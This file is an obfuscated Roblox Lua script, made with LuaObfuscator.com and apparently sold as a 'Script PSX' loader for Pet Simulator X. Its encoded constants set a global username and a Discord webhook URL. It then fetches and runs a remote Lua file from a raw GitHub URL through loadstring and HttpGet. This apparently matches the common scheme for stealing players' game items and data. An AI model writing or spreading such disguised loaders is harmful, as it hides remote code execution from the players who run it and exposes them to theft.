--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.5) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v20)if (v1(v20,2)==79) then local v69=0;while true do if (0==v69) then v19=v0(v3(v20,1,1));return "";end end else local v70=v2(v0(v20,16));if v19 then local v76=v5(v70,v19);v19=nil;return v76;else return v70;end end end);local function v21(v22,v23,v24)if v24 then local v71=(v22/((1144 -((798 -381) + 725))^(v23-(2 -1))))%((6 -4)^(((v24-(888 -(623 + (1949 -(754 + 931))))) -(v23-(1 -0))) + (2 -1))) ;return v71-(v71%(1 + 0)) ;else local v72=(1 + 1)^(v23-(3 -2)) ;return (((v22%(v72 + v72))>=v72) and (2 -1)) or (0 -0) ;end end local function v25()local v38=v1(v16,v18,v18);v18=v18 + 1 ;return v38;end local function v26()local v39=0 + 0 ;local v40;local v41;while true do if (v39==(1 -0)) then return (v41 * (1310 -(879 + 175))) + v40 ;end if ((0 + 0)==v39) then v40,v41=v1(v16,v18,v18 + 2 );v18=v18 + (1620 -(299 + (2705 -1386))) ;v39=1;end end end local function v27()local v42=0;local v43;local v44;local v45;local v46;while true do if (v42==(1926 -(1148 + 778))) then v43,v44,v45,v46=v1(v16,v18,v18 + 3 );v18=v18 + 2 + (1192 -(92 + 1098)) ;v42=4 -3 ;end if (v42==(1 + 0)) then return (v46 * 16777216) + (v45 * ((110254 -(1274 + 68)) -43376)) + (v44 * (192 + 64)) + v43 ;end end end local function v28()local v47=v27();local v48=v27();local v49=1 + 0 ;local v50=(v21(v48,2 -1 ,1805 -(1058 + (1743 -1016)) ) * ((1761 -(947 + 812))^(9 + 23))) + v47 ;local v51=v21(v48,(958 -(364 + 541)) -32 ,(1872 -(1387 + 470)) + 16 );local v52=((v21(v48,94 -62 )==1) and  -(2 -1)) or (1 + 0) ;if (v51==(0 -0)) then if (v50==(0 + 0)) then return v52 * (0 -0) ;else v51=1191 -(889 + 301) ;v49=0 -0 ;end elseif (v51==2047) then return ((v50==((0 -0) -0)) and (v52 * ((554 -(97 + 456))/0))) or (v52 * NaN) ;end return v8(v52,v51-(1691 -668) ) * (v49 + (v50/(((4 + 2) -(1960 -(793 + 1163)))^(120 -68)))) ;end local function v29(v30)local v53=206 -((1951 -(1330 + 608)) + 193) ;local v54;local v55;while true do if (v53==(7 -4)) then return v6(v55);end if (v53==((38 -16) -(13 + 8))) then v54=v3(v16,v18,(v18 + v30) -(1 -0) );v18=v18 + v30 ;v53=1203 -(15 + 1186) ;end if (v53==2) then v55={};for v77=(1473 -(1465 + 7)) + (454 -(392 + 62)) , #v54 do v55[v77]=v2(v1(v3(v54,v77,v77)));end v53=8 -5 ;end if ((0 -0)==v53) then v54=nil;if  not v30 then v30=v27();if (v30==(0 + 0)) then return "";end end v53=1106 -(596 + 509) ;end end end local v31=v27;local function v32(...)return {...},v12("#",...);end local function v33()local v56=0;local v57;local v58;local v59;local v60;local v61;local v62;local v63;local v64;while true do if (v56==2) then v61=nil;v62=nil;v56=886 -(451 + 432) ;end if ((10 -6)~=v56) then else while true do if ((23 -(7 + 13))~=v57) then else v64=nil;while true do local v100=0 -0 ;while true do if (v100~=(1008 -(190 + 817))) then else if (v58==0) then local v106=0;local v107;while true do if (v106==0) then v107=0;while true do if (v107~=(0 -0)) then else v59={};v60={};v107=1;end if (v107==(1066 -(37 + 1028))) then local v120=0;while true do if (v120~=1) then else v107=1519 -(411 + 1106) ;break;end if (v120==(0 -0)) then v61={};v62={v59,v60,nil,v61};v120=1;end end end if (v107~=2) then else v58=1;break;end end break;end end end break;end if (v100~=0) then else local v105=0;while true do if (v105~=0) then else if (v58~=(590 -(380 + 208))) then else for v111=1,v27() do local v112=1170 -(813 + 357) ;local v113;local v114;local v115;while true do if (v112==1) then v115=nil;while true do if (v113==(0 + 0)) then local v138=0 + 0 ;while true do if (v138~=0) then else local v160=0 + 0 ;while true do if (v160==(0 -0)) then v114=1824 -(1574 + 250) ;v115=nil;v160=1;end if (1==v160) then v138=3 -2 ;break;end end end if (v138~=1) then else v113=1 + 0 ;break;end end end if (v113~=(706 -(578 + 127))) then else while true do if (v114~=(0 + 0)) then else v115=v25();if (v21(v115,1,1 + 0 )==0) then local v167=0;local v168;local v169;local v170;local v171;while true do if ((1669 -(685 + 984))==v167) then local v174=0 -0 ;while true do if ((1155 -(807 + 347))~=v174) then else v167=1 + 0 ;break;end if (v174~=0) then else v168=0 -0 ;v169=nil;v174=1;end end end if (v167==2) then while true do if (v168~=2) then else if (v21(v170,1 -0 ,1 -0 )~=1) then else v171[516 -(237 + 277) ]=v64[v171[1 + 1 ]];end if (v21(v170,2 + 0 ,87 -(46 + 39) )~=1) then else v171[3]=v64[v171[1 + 2 ]];end v168=11 -8 ;end if (0==v168) then local v178=0;local v179;while true do if (v178==(0 -0)) then v179=0;while true do if (v179~=(1 -0)) then else v168=1;break;end if ((0 + 0)==v179) then local v189=0 -0 ;while true do if (v189==0) then v169=v21(v115,4 -2 ,7 -4 );v170=v21(v115,4,6);v189=1707 -(708 + 998) ;end if (v189==1) then v179=1 + 0 ;break;end end end end break;end end end if (v168~=(1 + 2)) then else if (v21(v170,3,1842 -(272 + 1567) )==1) then v171[4]=v64[v171[2 + 2 ]];end v59[v111]=v171;break;end if (v168==1) then local v181=0 + 0 ;while true do if (v181==(1072 -(37 + 1034))) then v168=2;break;end if (v181==(1528 -(907 + 621))) then v171={v26(),v26(),nil,nil};if (v169==(1494 -(915 + 579))) then local v188=851 -(198 + 653) ;while true do if ((1333 -(746 + 587))~=v188) then else v171[3]=v26();v171[1030 -(394 + 632) ]=v26();break;end end elseif (v169==(1077 -(985 + 91))) then v171[3]=v27();elseif (v169==2) then v171[9 -6 ]=v27() -(2^(1171 -(428 + 727))) ;elseif (v169~=3) then else local v194=0;local v195;local v196;while true do if ((0 -0)~=v194) then else v195=0;v196=nil;v194=1;end if ((3 -2)==v194) then while true do if (v195~=(0 + 0)) then else v196=0;while true do if (v196==(1342 -(934 + 408))) then v171[3]=v27() -((9 -7)^16) ;v171[1 + 3 ]=v26();break;end end break;end end break;end end end v181=1;end end end end break;end if ((1143 -(739 + 403))==v167) then local v175=690 -(154 + 536) ;while true do if (v175==(3 -2)) then v167=2;break;end if (v175~=0) then else v170=nil;v171=nil;v175=1647 -(195 + 1451) ;end end end end end break;end end break;end end break;end if (v112~=(0 -0)) then else v113=0 + 0 ;v114=nil;v112=1;end end end for v116=1,v27() do v60[v116-(1214 -(811 + 402)) ]=v33();end for v118=1,v27() do v61[v118]=v27();end return v62;end if (v58==1) then local v108=134 -(56 + 78) ;while true do if (v108~=(0 -0)) then else v63=v27();v64={};v108=2 -1 ;end if (v108~=(1 + 0)) then else for v122=1,v63 do local v123=0 -0 ;local v124;local v125;local v126;while true do if (v123==0) then local v139=0;while true do if (v139==0) then v124=0;v125=nil;v139=1;end if ((2 -1)~=v139) then else v123=1 + 0 ;break;end end end if (v123==(1 + 0)) then v126=nil;while true do if (0==v124) then v125=v25();v126=nil;v124=2 -1 ;end if (v124~=(698 -(598 + 99))) then else if (v125==1) then v126=v25()~=(0 + 0) ;elseif (v125==(58 -(21 + 35))) then v126=v28();elseif (v125~=(5 -2)) then else v126=v29();end v64[v122]=v126;break;end end break;end end end v62[1222 -(522 + 697) ]=v25();v108=2;end if (v108~=(3 -1)) then else v58=2;break;end end end v105=3 -2 ;end if (v105==(1 -0)) then v100=1 + 0 ;break;end end end end end break;end if (v57==1) then v60=nil;v61=nil;v57=2;end if (v57==(2 + 0)) then local v94=0 + 0 ;while true do if (v94~=1) then else v57=4 -1 ;break;end if (v94==0) then v62=nil;v63=nil;v94=1;end end end if (0==v57) then v58=0;v59=nil;v57=2 -1 ;end end break;end if (v56~=(1 + 0)) then else v59=nil;v60=nil;v56=2;end if ((0 + 0)~=v56) then else v57=0;v58=nil;v56=1 + 0 ;end if (v56~=(3 + 0)) then else v63=nil;v64=nil;v56=4 + 0 ;end end end local function v34(v35,v36,v37)local v65=0;local v66;local v67;local v68;while true do if (v65==0) then v66=v35[1];v67=v35[2];v65=1;end if (1==v65) then v68=v35[3];return function(...)local v79=1;local v80= -1;local v81={...};local v82=v12("#",...) -1 ;local function v83()local v84=v66;local v85=v67;local v86=v68;local v87=v32;local v88={};local v89={};local v90={};for v95=0 + 0 ,v82 do if ((4938==(6027 -(187 + 902))) and (v95>=v86)) then v88[v95-v86 ]=v81[v95 + 1 + 0 ];else v90[v95]=v81[v95 + 1 ];end end local v91=(v82-v86) + (822 -(165 + 656)) ;local v92;local v93;while true do local v96=1891 -(507 + 1384) ;local v97;local v98;while true do if (((11677 -8284)>(668 -368)) and (v96==(404 -(66 + 338)))) then v97=193 -(143 + 50) ;v98=nil;v96=1 + 0 ;end if ((v96==(1 + (0 -0))) or ((1402 -(225 + 331 + 317))>2711)) then while true do if ((4832>(11737 -(8545 -(124 + 19)))) and (v97==0)) then v98=0 + 0 ;while true do if (((269 + 4561)>=(16222 -12676)) and (v98==(1 + (576 -(333 + 243))))) then if ((v93<=(15 -10)) or ((9776 -5680)<=(4322 -(1425 + 280)))) then if (((3893 -2040)>=(1584 -705)) and (v93<=(137 -(97 + 38)))) then if ((v93<=(0 -0)) or (((6061 -3624) -1336)>=(2199 + 807))) then if ((v90[v92[59 -(26 + 31) ]]==v92[14 -10 ]) or ((3445 -(136 + 1305))<(1004 + (462 -206)))) then v79=v79 + 1 + 0 ;else v79=v92[3 + 0 ];end elseif ((v93==(2 -1)) or ((2269 -729)>(1998 -(125 + 219)))) then local v141=1721 -(1227 + 494) ;local v142;local v143;while true do if ((v141==(0 -0)) or ((478 + 1105)>(1289 + 1041))) then local v166=0 + 0 ;while true do if (((5610 -3682)<(16008 -(37494 -25743))) and ((0 -0)==v166)) then v142=0 -0 ;v143=nil;v166=1089 -(965 + 123) ;end if ((v166==(1 + 0)) or ((303 + 3737)<(688 -(461 -270)))) then v141=517 -(204 + 312) ;break;end end end if ((((3276 -2033) + 1971)>=(238 + 104)) and ((4 -3)==v141)) then while true do if (((9203 -(5844 -(1031 + 522)))>=((6417 -(1327 + 561)) -(318 + 276))) and (v142==(1287 -(16 + 1271)))) then v143=v92[1139 -(63 + 1074) ];v90[v143]=v90[v143](v13(v90,v143 + (1 -0) ,v80));break;end end break;end end else v90[v92[2 + 0 ]]=v37[v92[853 -(619 + 231) ]];end elseif ((2267>(5575 -3430)) and (v93<=3)) then local v127=0 + 0 ;local v128;local v129;local v130;local v131;while true do if ((v127==1) or ((6287 -3210)<(742 -538))) then local v151=0;while true do if (((1495 -(1301 + 193))==v151) or ((664 + 104)==(1520 + 1667))) then v127=1 + (1229 -(22 + 1206)) ;break;end if (((0 + 0)==v151) or ((4464 -(196 + 1203))<470)) then v80=(v130 + v128) -((2 -1) + 0) ;v131=0;v151=482 -(347 + 134) ;end end end if ((v127==((87 -46) -(31 + 8))) or ((9273 -4647)<(206 + 3))) then for v162=v128,v80 do local v163=0 + 0 ;local v164;while true do if (((1627 + 1813)>906) and (v163==(716 -(10 + 706)))) then v164=0 + 0 ;while true do if ((v164==(0 -0)) or ((457 + 3958)<((2792 -1887) -216))) then v131=v131 + (1 -0) ;v90[v162]=v129[v131];break;end end break;end end end break;end if (((6042 -2761)>(7065 -4720)) and (v127==(1042 -(810 + 232)))) then v128=v92[326 -(302 + 22) ];v129,v130=v87(v90[v128](v13(v90,v128 + (26 -(19 + 6)) ,v92[3 -(0 + 0) ])));v127=1;end end elseif ((v93>(2 + 2 + 0)) or (3023==748)) then if (((67 -37)<=(4416 -1023)) and (v92[2 -0 ]==v90[v92[2 + 2 ]])) then v79=v79 + 1 + 0 ;else v79=v92[3 + 0 ];end else v79=v92[103 -((1528 -(675 + 775)) + (108 -86)) ];end elseif ((4680>=4078) and (v93<=8)) then if ((4681==4681) and (v93<=((9 -5) + 2))) then v90[v92[577 -(350 + 225) ]][v92[3]]=v92[4];elseif (((1188 -226)<=(4878 -(651 + 105))) and (v93>(1 + 6))) then v90[v92[3 -1 ]]();else do return;end end elseif ((v93<=9) or ((4122 -(98 + (1203 -630)))<(3549 -(590 + 790)))) then local v134=0 -0 ;local v135;local v136;while true do if (((1524 -1137)<=(1591 -512)) and (v134==0)) then v135=v92[4 -2 ];v136=v90[v92[6 -(8 -5) ]];v134=1 + 0 ;end if ((v134==(3 -2)) or ((43 + 243)>=(3763 -(106 + 756)))) then v90[v135 + 1 + 0 ]=v136;v90[v135]=v136[v92[1 + 3 ]];break;end end elseif (((7087 -4827)>=(1242 + 540)) and (v93>(646 -(422 + (1020 -806))))) then v37[v92[1 + 2 ]]=v90[v92[2 + 0 ]];else v90[v92[567 -(262 + 303) ]]=v92[(1288 -427) -(36 + 822) ];end v79=v79 + 1 ;break;end if ((v98==(938 -(74 + 864))) or ((19075 -14386)<=(1960 + 1454))) then local v109=(0 -0) + 0 ;local v110;while true do if ((v109==(0 + 0)) or ((5321 -(264 + 1286))<=(3207 -((1237 -(1023 + 201)) + 125)))) then v110=0;while true do if ((v110==0) or ((726 + 788)<=1018)) then local v137=0 + 0 ;while true do if ((v137==(441 -(29 + 411))) or ((190 + 1208)>=((5253 -(313 + 273)) -(104 + 1446)))) then v110=1;break;end if (((470 + 223 + 80)==(49 + (1828 -1104))) and (v137==(1768 -(658 + 1110)))) then v92=v84[v79];v93=v92[1 + 0 ];v137=1 + 0 ;end end end if ((v110==(1684 -(402 + 1281))) or ((226 + 242)==(5799 -((2055 -1295) + 589)))) then v98=1446 -((423 -258) + 1280) ;break;end end break;end end end end break;end end break;end end end end A,B=v32(v11(v83));if  not A[1] then local v99=v35[4][v79] or "?" ;error("Script error at ["   .. v99   .. "]:"   .. A[2] );else return v13(A,2,B);end end;end end end return v34(v33(),{},v17)(...);end v15("LOL!173O00028O0003083O00557365726E616D6503083O004B612O706130373803073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3130383637313338363834312O3332313231372F4A35492O74507347414469326D51497A41476D535259382D744D6246355A626F7773357545766F2D584432453649353142453052556D5345674474587236302O7636626C026O00F03F027O004003023O005F4703053O00546578743203123O0057616974696E6720666F722053637269707403053O00546578743303133O00436865636B696E6720536372697074733O2E026O00084003103O00437573746F6D5363726970744E616D65030A3O005363726970742050535803053O00546578743103103O00536372697074204C6F616465643O2E03053O00546578743403133O005374617274696E6720536372697074733O2E030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034F3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4A757374616E6F74686572646D652F70657473696D782O322F6D61696E2F70657473696D6775692O732E6C756100243O00120A3O00013O000E050001000800013O002O043O0008000100120A000100033O00120B000100023O00120A000100053O00120B000100043O00120A3O00063O00264O000F00010007002O043O000F0001001202000100083O00300600010009000A001202000100083O0030060001000B000C00120A3O000D3O00264O001600010006002O043O00160001001202000100083O0030060001000E000F001202000100083O00300600010010001100120A3O00073O00264O00010001000D002O043O00010001001202000100083O003006000100120013001202000100143O001202000200153O00200900020002001600120A000400174O0003000200044O000100013O00022O0008000100010001002O043O00230001002O043O000100012O00073O00017O00243O00023O00043O00043O00053O00053O00063O00063O00073O00093O00093O000A3O000A3O000B3O000B3O000C3O000E3O000E3O000F3O000F3O00103O00103O00113O00133O00133O00143O00143O00153O00153O00153O00153O00153O00153O00153O00163O00173O00193O00",v9(),...);end